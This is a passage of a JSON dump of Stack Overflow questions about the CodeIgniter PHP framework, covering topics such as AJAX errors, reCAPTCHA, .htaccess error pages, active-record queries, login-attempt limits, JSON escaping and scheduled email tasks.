saved.</p>\n\n<pre><code>Note: Cookies can only hold 4KB of data, so be careful not to exceed the capacity. The encryption process in particular produces a longer data string than the original so keep careful track of how much data you are storing.\n</code></pre>\n\n<p>So, how does this give more flexibility to the programmer at all? What was the actual Reason of the developers to <strong>not</strong> use native PHP Sessions?</p>\n\n<p>Thank you for your Information!</p>\n"},{"tags":["php","codeigniter","recaptcha"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12923381,"title":"reCaptcha validating user when incorrect captcha submitted","body":"<p>I'm trying to setup reCaptcha for my Codeigniter project.  The recaptchalib.php file is saved in the views folder.  </p>\n\n<p>My registration view page includes the following:</p>\n\n<pre><code>&lt;form method=\"post\" action=\"cyoa/verify.php\"&gt;\n&lt;?php\nrequire_once('recaptchalib.php');\n$publickey = \"correct_public_key_inserted_here\";\necho recaptcha_get_html($publickey);\n?&gt;\n&lt;input type=\"submit\" /&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>My cyoa controller includes the following verify function:</p>\n\n<pre><code>public function verify()\n{\n    require_once('views/recaptchalib.php');\n    $privatekey = \"correct_private_key_inserted_here\";\n    $resp = recaptcha_check_answer ($privatekey,\n                                $_SERVER[\"REMOTE_ADDR\"],\n                                $_POST[\"recaptcha_challenge_field\"],\n                                $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp-&gt;is_valid) {\n    // What happens when the CAPTCHA was entered incorrectly\n    die (\"The reCAPTCHA wasn't entered correctly. Go back and try it again.\" .\n         \"(reCAPTCHA said: \" . $resp-&gt;error . \")\");\n    } else {\n        redirect('cyoa/index');\n    // Your code here to handle a successful verification\n    }\n}\n</code></pre>\n\n<p>The issue I'm having is that the page always redirects to cyoa/index.  What am I doing wrong?</p>\n"},{"tags":["jquery","ajax","codeigniter","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":85,"score":2,"question_id":12922905,"title":"JQuery AJAX throws 404 for an existing url","body":"<p>I'm using Jquery ajax to call a CodeIgniter function:</p>\n\n<pre><code>$.ajax({\n  type: \"POST\",\n  dataType:'json',\n  beforeSend: function() {\n  $(\"#opc\").addClass(\"opacity\");\n  $(\"#searching\").show(); \n  },\n  url: \"&lt;?php echo base_url(); ?&gt;search/get_results\",\n  data: {\n    'ns_pos':ns_pos,\n    'NSPlaceDomainID':activity,\n    'DistrictID':area,\n    'NSAssociationID':referer,\n    'Title':text,\n    'SettlementID':settlement,\n    'NoOpinion':$(\"input[name=NoOpinion]\").is(\":checked\"),\n     'SpecialCharacteristics':ns_attr\n  } \n</code></pre>\n\n<p>etc...</p>\n\n<p>In the Chrome console I get the message:</p>\n\n<pre><code>POST http://mattat.org.il/ci/index.php/search/get_results 404 (Not Found) \n</code></pre>\n\n<p>the response preview is:</p>\n\n<pre><code>Not Found\n\nThe requested URL /ci/index.php/search/get_results was not found on this server.\n\nAdditionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.\n</code></pre>\n\n<p>However, this function <strong>does</strong> exist, as is evident when I simply paste the link in the URL line.</p>\n\n<p>I'm confused...</p>\n\n<p>edit: Following @paul's constructive comment I have changed the request to GET and, indeed, the page was found. What can cause such an obscure behaviour?</p>\n\n<p>One more step: When I empty the data object (like so: data: {}), the function <strong>is</strong> found even with POST request</p>\n"},{"tags":["apache",".htaccess","codeigniter","mod-rewrite","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":310,"score":0,"question_id":11113366,"title":"HTACCESS ErrorDocument 404 /404.htm not working","body":"<p>Am using COdeigniter.. \nI have a .htaccess. ANd the problem is that the server when access www.example.com/notfoundimage.png which is not available on server, should redirect it to .404htm (designed error document template)... however instead, it  gives a server error</p>\n\n<p>HTACCES:</p>\n\n<pre><code>ErrorDocument 404 /404.htm \nErrorDocument 400 /404.htm\nErrorDocument 403 /404.htm\n\nErrorDocument 500 /404.htm\n</code></pre>\n\n<p>Error when accessing non-existent file www.example.com/notfoundimage.png</p>\n\n<blockquote>\n  <p>Server error The website encountered an error while retrieving\n  <a href=\"http://www.example.com/notfoundimage.png\" rel=\"nofollow\">http://www.example.com/notfoundimage.png</a>. It may be down for\n  maintenance or configured incorrectly.</p>\n</blockquote>\n\n<p>If i comment this line from htaccess </p>\n\n<blockquote>\n  <p>ErrorDocument 404 /404.htm</p>\n</blockquote>\n\n<p>The error 404 (which should be) comes up. But i need the above line to redirect 404 to my template page: 404.htm</p>\n"},{"tags":["ajax","codeigniter","modal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":12919241,"title":"AJAX within a modal inserting a form in CodeIgniter","body":"<p>Been struggling with this for about 4 hours, I'm attempting to have a modal drop down (Twitter bootstrap modal) that contains a form to create a Company. This is built in CodeIgniter.</p>\n\n<p>I'm having issues with input type=\"submit\" and input type=\"button\".</p>\n\n<p>I only have 1 required field, which is Company Name. If I use input type=\"button\", the validation will fire correctly inside of the modal, however the form will only INSERT just the company name, along with company_id, user_id, active, and cdate.</p>\n\n<p>Now if I use input type=\"submit\", all the data inserts fine. However, the validation breaks and I get a \"Page cannot be found\" after clicking \"Create Company\", the data is still inserting though.</p>\n\n<p>Any ideas? Thanks! New to AJAX...</p>\n\n<p>My AJAX function:</p>\n\n<pre><code>   $(document).ready(function(){\n\n  $('#create_btn').live('click', function(){\n      //we'll want to move to page specific files later\n\n    var name = $('#name').val();\n\n    $.ajax({\n        url: CI_ROOT + \"members/proposals/add_client\",\n        type: 'post',\n        data: {'name': name },\n        complete: function(r){\n          var response_obj = jQuery.parseJSON(r.responseText);\n\n          if (response_obj.status == 'SUCCESS')\n          {\n              window.location = CI_ROOT + response_obj.data.redirect;\n          }\n          else\n          {       \n            $('#error_message2').html(response_obj.data.err_msg);\n          }\n        },\n    });     \n\n\n  });\n\n});\n</code></pre>\n\n<p>My controller function which handles the insert:</p>\n\n<pre><code>    function add_client()\n{\n\n    $this-&gt;form_validation-&gt;set_rules('name', 'Company Name', 'trim|required|xss_clean');\n\n    load_model('client_model', 'clients');\n    load_model('industry_model');\n\n    $user_id = get_user_id();\n    $company_id = get_company_id();\n\n    if (!$user_id || !$company_id) redirect('home');\n\n    if ($_POST)\n    {\n\n        if ($this-&gt;form_validation-&gt;run() == TRUE)\n        { \n\n        $fields = $this-&gt;input-&gt;post(null , TRUE);\n\n\n        $fields['user_id'] = $user_id;\n        $fields['company_id'] = $company_id;\n        $fields['active'] = 1;\n        $fields['cdate'] = time();\n\n\n        $insert = $this-&gt;clients-&gt;insert($fields);\n\n            if ($insert)\n            {\n                $this-&gt;message-&gt;set('alert alert-success', '&lt;h4&gt;Company has been added&lt;/h4&gt;');\n                header('location:'.$_SERVER['HTTP_REFERER']);\n            }\n            else\n            {\n                $this-&gt;message-&gt;set('alert alert-error', '&lt;h4&gt;There was an issue adding this Company, please try again&lt;/h4&gt;');\n            }                   \n\n\n        }\n\n\n        else\n        {  \n            $err_msg =  validation_errors('&lt;div class=\"alert alert-error\"&gt;', '&lt;/div&gt;'); \n            $retval = array('err_msg'=&gt;$err_msg);\n            $this-&gt;ajax_output($retval, false);\n        }\n\n    }\n\n    $this-&gt;data['industries'] = array(0=&gt;'Select Industry...') + $this-&gt;industry_model-&gt;dropdown('industry');   \n\n    $this-&gt;insertMethodJS();\n    $this-&gt;template-&gt;write_view('content',$this-&gt;base_path.'/'.build_view_path(__METHOD__), $this-&gt;data);           \n    $this-&gt;template-&gt;render();\n}\n</code></pre>\n\n<p>And finally, my view:</p>\n\n<pre><code>    &lt;div class=\"modal hide fade\" id=\"milestone\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"myModalLabel\" aria-hidden=\"true\" style=\"width: 600px !important;\"&gt;\n  &lt;div class=\"modal-header\"&gt;\n    &lt;button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\"&gt;×&lt;/button&gt;\n    &lt;h3 id=\"myModalLabel\"&gt;Add a Company&lt;/h3&gt;\n  &lt;/div&gt;\n\n  &lt;div class=\"modal-body\"&gt;\n\n    &lt;?php echo form_open_multipart(base_url().'members/proposals/add_client', array('class' =&gt; '', 'id' =&gt; 'client_form'));?&gt;   \n\n    &lt;div id=\"error_message2\"&gt;&lt;/div&gt; \n\n    &lt;div class=\"row-fluid\"&gt;\n        &lt;div class=\"span5\"&gt;\n\n            &lt;input type=\"hidden\" name=\"cdate\" id=\"cdate\" value=\"\" /&gt;\n\n            &lt;div class=\"control-group\"&gt;\n            &lt;label class=\"control-label\"&gt;Company Name: &lt;span style=\"color: red;\"&gt;*&lt;/span&gt;&lt;/label&gt;\n                &lt;div class=\"controls\"&gt;\n                    &lt;input type=\"text\" id=\"name\" name=\"name\" value=\"\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;  \n\n            &lt;div class=\"control-group\"&gt;\n            &lt;label class=\"control-label\"&gt;Company Abbreviation:&lt;span style=\"color: red;\"&gt;*&lt;/span&gt;&lt;/label&gt;\n                &lt;div class=\"controls\"&gt;\n                    &lt;input type=\"text\" id=\"abbreviation\" name=\"abbreviation\" value=\"\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;      \n\n\n            &lt;div class=\"control-group\"&gt;\n            &lt;label class=\"control-label\"&gt;Company Image: &lt;/label&gt;\n                &lt;div class=\"controls\"&gt;\n                        &lt;input type=\"file\" name=\"client_image\" size=\"20\" /&gt; \n                &lt;/div&gt;\n            &lt;/div&gt;\n\n            &lt;/div&gt;  \n\n            &lt;div class=\"span5\"&gt;\n\n            &lt;div class=\"control-group\"&gt;\n            &lt;label class=\"control-label\"&gt;Website:&lt;/label&gt;\n                &lt;div class=\"controls\"&gt;\n                    &lt;input type=\"text\" id=\"website\" name=\"website\" value=\"\"/&gt; \n                &lt;/div&gt;\n            &lt;/div&gt;  \n\n       &lt;/div&gt;\n\n    &lt;/div&gt;  \n\n\n\n&lt;div class=\"row-fluid\"&gt;\n    &lt;div class=\"span5\" style=\"margin-top: 25px;\"&gt;\n\n    &lt;div class=\"control-group\"&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;p&gt;&lt;strong&gt;Client&lt;/strong&gt;&lt;/p&gt;\n            &lt;/div&gt;\n    &lt;/div&gt;  \n\n\n    &lt;div class=\"control-group\"&gt;\n        &lt;label class=\"control-label\"&gt;Address 1:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;input type=\"text\" id=\"address1\" name=\"address1\" value=\"\"/&gt;\n            &lt;/div&gt;\n    &lt;/div&gt;  \n\n    &lt;div class=\"control-group\"&gt;\n        &lt;label class=\"control-label\"&gt;Address 2:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;input type=\"text\" id=\"address2\" name=\"address2\" value=\"\"/&gt;\n            &lt;/div&gt;\n    &lt;/div&gt;      \n\n    &lt;div class=\"control-group\"&gt;\n        &lt;label class=\"control-label\"&gt;City:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;input type=\"text\" name=\"city\" id=\"city\"  value=\"\"/&gt;\n            &lt;/div&gt;\n    &lt;/div&gt;  \n\n\n    &lt;div class=\"control-group\"&gt;\n        &lt;label class=\"control-label\"&gt;State:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;?= form_dropdown('state', usa_state_list(), set_value('state'), 'id=state');  ?&gt;     \n            &lt;/div&gt;\n    &lt;/div&gt;  \n\n    &lt;div class=\"control-group\"&gt;\n        &lt;label class=\"control-label\"&gt;Zip:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;input type=\"text\" id=\"zip\" name=\"zip\" value=\"\"/&gt;\n            &lt;/div&gt;\n    &lt;/div&gt;  \n\n    &lt;div class=\"control-group\"&gt;\n        &lt;label class=\"control-label\"&gt;Country:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;?= form_dropdown('country', country_list(), set_value('country'), 'id=country');  ?&gt;    \n            &lt;/div&gt;\n    &lt;/div&gt;\n\n  &lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n\n  &lt;div class=\"modal-footer\"&gt;\n    &lt;button class=\"btn\" data-dismiss=\"modal\" aria-hidden=\"true\"&gt;Close&lt;/button&gt;\n    &lt;button type=\"submit\" class=\"btn btn-primary\" id=\"create_btn\"&gt;Create Company&lt;/button&gt;\n  &lt;/div&gt;\n &lt;/form&gt; \n&lt;/div&gt;\n</code></pre>\n\n<p>So again, to summarize. With input type=\"button\", my validation works great within the modal and only the Company Name is inserting into the database along with company_id, user_id, active, and cdate.</p>\n\n<p>Now, with input type=\"submit\", all data inserts great, however validation fails and I get a redirect to a page cannot be found.</p>\n\n<p>Again, thanks!</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12920962,"title":"how to increase database column value by one?","body":"<p>So basically I have a database, and on each update I need to increase it's countValue by 1. </p>\n\n<p>How would I do it with codeIgniter?</p>\n\n<p>Here are some code -</p>\n\n<pre><code>            $data = array(\n                \"up\" =&gt; date('Y-m-d H:i:s'),\n                \"viewCount\" =&gt; viewCount+1\n            );              \n            $this-&gt;db-&gt;where('url', $url);\n            $this-&gt;db-&gt;update('table', $data);  \n</code></pre>\n\n<p>How would I do that? I know that I must change viewCount+1 to something else for it to work. Hope I explained the question well enough. With default SQL query I would be able to do it just with <code>SET count = count + 1</code> , but here it's not working.</p>\n"},{"tags":["php","codeigniter","login","captcha","ion-auth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12918033,"title":"ionauth login maximum attempts implementation","body":"<p>Hey guys was hoping you can help me out</p>\n\n<p>I have just started using ionauth and am trying to implement the maximum login attempts feature..</p>\n\n<p>Problem is I cant seem to find any documentation regarding this function on the documentation </p>\n\n<p>\"http://benedmunds.com/ion_auth/\"</p>\n\n<p>I figured out the function to call to check if maximum login attempts exceeded was this</p>\n\n<pre><code>$this-&gt;ion_auth-&gt;is_max_login_attempts_exceeded()\n</code></pre>\n\n<p>I'd like to know what protection to do if login attempts are exceeded? block the user for a specific time? enforce a captcha? both? And if he enter a correct captcha (assuming I enforce captcha) or if the time runs out (assuming I stop login attempts for a specific time), how do I allow login's again?</p>\n\n<p>Thanks.</p>\n"},{"tags":["codeigniter","model","load","where"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12919728,"title":"Codeigniter: Check where model is loaded from?","body":"<p>I'm having the strangest thing ever right now.</p>\n\n<p>I \"disabled\" a model because i don't need to access it ever again. I did so by echoing out an error string in the __construct() and right after that die(). That way i would notice if i ever loaded the model, even by mistake, which should never happen. Alright?</p>\n\n<p>The problem is, the model is not loaded ANYWHERE in the entire project, but it still gets loaded for some reason. It's not auto loaded, that's for sure.</p>\n\n<p>Is it possible to track down where a model is loaded? Like which line it happens etc?</p>\n"},{"tags":["php","codeigniter","activerecord"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12906156,"title":"Codeigniter active record : how to read the joined table","body":"<p>i have some table, and the relationship goes like this</p>\n\n<p><img src=\"http://i.stack.imgur.com/QAALu.png\" alt=\"img\"></p>\n\n<p>and i want to get all the record of those 2 tables. so i use this query in my model</p>\n\n<pre><code> $this-&gt;db-&gt;select('*');\n    $this-&gt;db-&gt;from('ms_Kategori_Material.*,ms_Material_Jasa.*');\n    $this-&gt;db-&gt;join('ms_Material_Jasa', 'ms_Kategori_Material.Kode_Kategori_Material_Jasa = ms_Material_Jasa.Kode_Kategori_Material_Jasa');\n    $result = $this-&gt;db-&gt;get();\n\n    $table = $this-&gt;db-&gt;get();\n    return $table;\n</code></pre>\n\n<p>and then i got error</p>\n\n<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*, `ms_Material_Jasa`.*) JOIN `ms_Material_Jasa` ON `ms_Kategori_Material`.`Kode' at line 2\n\nSELECT * FROM (`ms_Kategori_Material`.*, `ms_Material_Jasa`.*) JOIN `ms_Material_Jasa` ON `ms_Kategori_Material`.`Kode_Kategori_Material_Jasa` = `ms_Material_Jasa`.`Kode_Kategori_Material_Jasa`\n</code></pre>\n\n<p>why do i can't read the needed table ? </p>\n"},{"tags":["javascript","ajax","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12918467,"title":"Hash tag, query string, and Ajaxified search results","body":"<p>I have a search form that automatically sends POST data my web application whenever something in the form changes. The web application (written in PHP/CodeIgniter) accepts POST or GET and returns the proper results and displays it on the page. Everything works fine.</p>\n\n<p>Now, my concern is that the URL does not reflect the query parameters needed to get the current search results. So, if someone copied the address and shared it, the people clicking on that URL won't see the intended data. Same problem with book marking, etc.</p>\n\n<p>It's possible to update the query string in jQuery, but that forces the browser to redirect to the new URL (which when it does, the page shows the correct search results because the web application was actually originally written to work non-JS). That redirecting means the Ajaxifying efforts were wasted.</p>\n\n<p>Seems like hash # can be used to update the address without making the browser redirect, but I can't seem to use that information in non-JS situation (I can't access that info via GET).</p>\n\n<p>What approach should I be using for this problem?</p>\n"},{"tags":["codeigniter","calendar","next"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12918399,"title":"How to create next prev by day in Codeigniter calendar?","body":"<p>I have a table and column to store data with date (2012-10-16). And I want to create a next prev buttons for user to view previous or next day data.</p>\n\n<p>I　tried Codeigniter calendar, the next and pre buttons are follow by month. How can I modify or add next prev button by day or how to create a next prev day button without using codeigniter calendar?</p>\n"},{"tags":["php","wordpress","codeigniter","customization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12915504,"title":"Integrate website login with wordpress login","body":"<p><a href=\"http://stackoverflow.com/questions/4734237/using-wordpress-login-functions\">Using wordpress login functions</a></p>\n\n<p>As reference to above link i tried to integrate login of wordpress with my website</p>\n\n<p>But it shows follwing error\nFatal error: Call to undefined function wp_signon()</p>\n\n<p>I am using codeigniter framework... and i call it from one of model</p>\n"},{"tags":["php","apache","codeigniter","mamp","lamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12917127,"title":"using CodeIgniter on MAMP","body":"<p>I've installed MAMP and I get the welcome page when I go to my localhost + :8888/MAMP/\nBut then I downloaded CI and put it in 'htdocs' inside MAMP and I can not get the CI welcome page. </p>\n\n<p>I'm not very experienced with setting up servers, what should I do??</p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":877,"score":0,"question_id":2635127,"title":"php script for currency conversion","body":"<p>I am looking for a php script that does currency conversion.</p>\n\n<p>Where can I find one that works with codeigniter?</p>\n"},{"tags":["json","codeigniter","datatables"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12330708,"title":"How to remove slashes from code?","body":"<p>I'm trying to understand where the slashes are added in my code.\nI'm using <a href=\"https://github.com/n1crack/IgnitedDatatables-native-php-version\" rel=\"nofollow\">Ignited Datatables (native-php-version)</a> to generate ajax tables for data from MySQL.</p>\n\n<p>Data from MySQL is displayed as I want but Ignited Datatables function allow me to add extra column to table and problems starts there.</p>\n\n<p>That's how I initialize adding that extra column:</p>\n\n<pre><code>-&gt;add_column('edit', '&lt;a class=\"btn btn-mini btn-success\" data-toggle=\"modal\" href=\"#?page=customers-database-edit&amp;id=$1\"&gt;Edit&lt;/a&gt;', 'face_id'); \n</code></pre>\n\n<p>The extra column I'm adding should contain only that link but in some reason the JSON is generated in this way:</p>\n\n<pre><code>\\n&lt;a class=\"\\&amp;quot;btn\" btn-mini=\"\" btn-success\\\"=\"\" data-toggle=\"\\&amp;quot;modal\\&amp;quot;\" href=\"\\&amp;quot;?page=customers-database-edit&amp;amp;id=3\\&amp;quot;\"&gt;Edit&amp;lt;\\/a&amp;gt; \\n&lt;/a&gt;\n</code></pre>\n\n<p>So as you see the problem is that code is broken and too many slashes.</p>\n\n<p>This peace of code is reponsible for adding that extra column with link:</p>\n\n<pre><code>public function add_column($column, $content, $match_replacement = NULL)\n{\n$this-&gt;add_columns[$column] = array('content' =&gt; $content, 'replacement' =&gt; $this-&gt;explode(',', $match_replacement));\nreturn $this;\n}\n\nforeach($this-&gt;add_columns as $field =&gt; $val)\n  if($this-&gt;check_mDataprop())\n    $aaData[$row_key][$field] = $this-&gt;exec_replace($val, $aaData[$row_key]);\n  else\n    $aaData[$row_key][] = $this-&gt;exec_replace($val, $aaData[$row_key]);\n\n\nprotected function exec_replace($custom_val, $row_data)\n\n{\n  $replace_string = '';\n\n  if(isset($custom_val['replacement']) &amp;&amp; is_array($custom_val['replacement']))\n  {\n    foreach($custom_val['replacement'] as $key =&gt; $val)\n    {\n      $sval = preg_replace(\"/(?&lt;!\\w)([\\'\\\"])(.*)\\\\1(?!\\w)/i\", '$2', trim($val));\n      if(preg_match('/(\\w+)\\((.*)\\)/i', $val, $matches) &amp;&amp; function_exists($matches[1]))\n      {\n        $func = $matches[1];\n        $args = preg_split(\"/[\\s,]*\\\\\\\"([^\\\\\\\"]+)\\\\\\\"[\\s,]*|\" . \"[\\s,]*'([^']+)'[\\s,]*|\" . \"[,]+/\", $matches[2], 0, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE);\n\n        foreach($args as $args_key =&gt; $args_val)\n        {\n          $args_val = preg_replace(\"/(?&lt;!\\w)([\\'\\\"])(.*)\\\\1(?!\\w)/i\", '$2', trim($args_val));\n          $args[$args_key] = (in_array($args_val, $this-&gt;columns))? ($row_data[($this-&gt;check_mDataprop())? $args_val : array_search($args_val, $this-&gt;columns)]) : $args_val;\n        }\n\n        $replace_string = call_user_func_array($func, $args);\n      }\n      elseif(in_array($sval, $this-&gt;columns))\n        $replace_string = $row_data[($this-&gt;check_mDataprop())? $sval : array_search($sval, $this-&gt;columns)];\n      else\n        $replace_string = $sval;\n\n      $custom_val['content'] = str_ireplace('$' . ($key + 1), $replace_string, $custom_val['content']);\n    }\n  }\n\n  return $custom_val['content'];\n}\n</code></pre>\n\n<p>I'm a bit confused where that slashes are added and whay that link code is broken?</p>\n\n<p>Here is how JSON is generated:</p>\n\n<pre><code>    protected function jsonify($result = FALSE)\n    {\n      if(is_null($result)) return 'null';\n      if($result === FALSE) return 'false';\n      if($result === TRUE) return 'true';\n\n      if(is_scalar($result))\n      {\n        if(is_float($result))\n          return floatval(str_replace(',', '.', strval($result)));\n\n        if(is_string($result))\n        {\n          static $jsonReplaces = array(array('\\\\', '/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'), array('\\\\\\\\', '\\\\/', '\\\\n', '\\\\t', '\\\\r', '\\\\b', '\\\\f', '\\\"'));\n          return '\"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $result) . '\"';\n        }\n        else\n          return $result;\n      }\n\n      $isList = TRUE;\n\n      for($i = 0, reset($result); $i &lt; count($result); $i++, next($result))\n      {\n        if(key($result) !== $i)\n        {\n          $isList = FALSE;\n          break;\n        }\n      }\n\n      $json = array();\n\n      if($isList)\n      {\n        foreach($result as $value)\n          $json[] = $this-&gt;jsonify($value);\n        return '[' . join(',', $json) . ']';\n      }\n      else\n      {\n        foreach($result as $key =&gt; $value)\n          $json[] = $this-&gt;jsonify($key) . ':' . $this-&gt;jsonify($value);\n        return '{' . join(',', $json) . '}';\n      }\n    }\n  }\n</code></pre>\n"},{"tags":["php","codeigniter","smtp","xampp","mailer"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12914144,"title":"XAMPP on macosx set the smtp mailer","body":"<p>Does anyone knows or has links to tutorials on how to setup the SMTP mailer for XAMPP?</p>\n\n<p>I would like to be able to send email from my mac cause i need to test my site registration confirm cycle.</p>\n\n<p>thx</p>\n"},{"tags":["php","windows","codeigniter","scheduled-tasks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12912486,"title":"scheduling task using task schedular in php","body":"<p>I want to schedule a php function to execute at a user's inputted scheduled time. Also my website is hosted in windows machine so I am looking for a windows based solution. I have made a function which looks like this:</p>\n\n<pre><code>function sendemail()\n{\n    $cmd = 'schtasks /create /sc ONCE /tn emailtask /tr http://example.com/index.php/emailnotifications/sendemail';\n    exec ($cmd);\n}\n</code></pre>\n\n<p>In the above code emailnotifications is my controller and sendemail is my function where I have written my code. Does anyone know a solution to create scheduled task in windows task schedular using php code?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12911786,"title":"Unable to split date and from from datetime","body":"<p>Fatal error: Call to a member function format() on a non-object in</p>\n\n<p>View</p>\n\n<pre><code> &lt;?php\n\n        $date = $listProject-&gt;enddate;\n   $data['enddate'] = $date-&gt;format('Y-m-d');\n   $time['time'] = $date-&gt;format('H:i:s');\n\n                                              ?&gt;\n\n &lt;?php echo get_datetime($listProject-&gt;enddate);?&gt;(&lt;?php echo '&lt;b style=\"color:red;\"&gt;'.days_left($listProject-&gt;enddate,$listProject-&gt;id).'&lt;/b&gt;';?&gt;)\n</code></pre>\n\n<p>Controller</p>\n\n<pre><code>$this-&gt;outputData['listProjects']   = $this-&gt;skills_model-&gt;getProjects($urgent_conditions,NULL,NULL,array(15),$order);\n$this-&gt;load-&gt;view('listProjects',$this-&gt;outputData);\n</code></pre>\n\n<p>Model</p>\n\n<pre><code>$this-&gt;db-&gt;select('projects.created,projects.enddate');\n</code></pre>\n\n<p>Thank you! :D\nI tried to do it on VIew and controller but still getting error, the error above is caused by View</p>\n\n<p>Add on Found this in MY_date_helper</p>\n\n<pre><code>if ( ! function_exists('get_datetime'))\n</code></pre>\n\n<p>{\n    function get_datetime($timestamp)</p>\n\n<pre><code>{\n    $CI =&amp; get_instance();\n    $CI-&gt;lang-&gt;load('enduser/common');\n    if(date('d/M/Y') == date('d/M/Y',$timestamp))\n    $date = $CI-&gt;lang-&gt;line('Today at').\" \".date('H:i',$timestamp).\" UTC\";\n    else\n    $date = date('d-M-Y H:i',$timestamp).\" UTC\";        \n    return $date;\n}\n</code></pre>\n\n<p>PHP Version :  5.2.17</p>\n"},{"tags":["facebook","codeigniter","facebook-like"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12912350,"title":"Facebook like button in CodeIgniter","body":"<p>How do you integrate the Facebook like button in CodeIgniter code? can any one please help me? how to display the like button in  a particular section of code in views...\ni have tried the basic html one but its not working </p>\n\n<pre><code>&lt;html xmlns:fb=\"http://ogp.me/ns/fb#\"&gt;\n&lt;body&gt;\n&lt;div id=\"fb-root\"&gt;&lt;/div&gt;\n&lt;script&gt;(function(d, s, id) {\nvar js, fjs = d.getElementsByTagName(s)[0];\nif (d.getElementById(id)) return;\njs = d.createElement(s); js.id = id;\njs.src = \"//connect.facebook.net/en_US/all.js#xfbml=1\";\nfjs.parentNode.insertBefore(js, fjs);\n}(document, 'script', 'facebook-jssdk'));&lt;/script&gt;\n</code></pre>\n\n<p>this is the button</p>\n\n<pre><code>&lt;fb:like send=\"true\" width=\"450\" show_faces=\"true\"&gt;&lt;/fb:like&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12081457,"title":"XSS filtering on input->post() while form validator is active in Ci","body":"<p>I was wondering. I'm using the form validation class in codeigniter. On most of my input fields I have xss filtering turned on: </p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('description', 'Description', 'required|xss_clean');\n</code></pre>\n\n<p>My question. The input class itself also has an XSS filtering parameter. Is it necessary to set this parameter as well, even when its gone trough the validator? </p>\n"},{"tags":["php","codeigniter","email","windows-services","scheduling"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12908851,"title":"windows services to perform schedule email in php","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12893499/schedule-an-email-in-php\">schedule an email in php</a>  </p>\n</blockquote>\n\n\n\n<p>I want to schedule my php script which sends emails using windows services as the website is hosted in windows machine. I am looking for a solution which does not involve cron jobs. I want users to schedule a time and the windows service should execute my php email script on the scheduled time so that emails are sent on the scheduled user time. I want to write the entire code in php.</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12905883,"title":"(CodeIgniter 2) Get mysql function result using active record class","body":"<p>I'm using <strong>CodeIgniter 2 (latest build)</strong>...let's say I have this query:</p>\n\n<pre><code>$CI-&gt;db-&gt;select(\"FileName, GUID, Count(GUID)\");\n$query = $CI-&gt;db-&gt;get('Files');\n</code></pre>\n\n<p>I know I can get GUID &amp; FileName columns using this syntax:</p>\n\n<pre><code>foreach ($query-&gt;result() as $row) {\n    $file_name = $row-&gt;FileName;\n}\n</code></pre>\n\n<p>But how can I get the <code>Count(GUID)</code>?</p>\n\n<p><strong>PS. This is a simple example to explain my question</strong>. All I need to know is how to get the <em>composed / mysql function result</em> using codeigniter active record</p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12909247,"title":"Ajax success 